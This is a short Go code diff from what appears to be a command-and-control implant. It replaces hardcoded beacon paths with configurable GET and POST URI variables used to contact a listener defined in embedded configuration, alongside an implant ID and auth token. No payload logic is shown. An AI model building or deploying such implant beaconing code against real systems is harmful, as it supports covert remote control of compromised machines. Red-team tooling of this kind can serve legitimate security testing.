@@ -80,6 +80,12 @@ func makePostRequest(baseUrl string, params string) (*http.Response, error) {
 // The 4 byte ID for the implant to use set at compile time
 var CompUUID string
 
+// The POST URI to use, varies on if compression is enabled or not
+var PostURI string
+
+// The GET URI to use, varies on if auth is enabled or not
+var GetURI string
+
 func main() {
 	// Load configuration from embedded data
 	conf, err := shared.LoadConfig()
@@ -91,9 +97,9 @@ func main() {
 
 	for {
 		baseUrl := ""
-		baseUrl = "http://" + conf.Listener + "/auth/" + CompUUID
+		baseUrl = "http://" + conf.Listener + GetURI + CompUUID
 		postUrl := ""
-		postUrl = "http://" + conf.Listener + "/un/" + CompUUID
+		postUrl = "http://" + conf.Listener + PostURI + CompUUID
 
 		token, timestamp := shared.GenerateAuthToken(CompUUID, conf.Psk2)
 
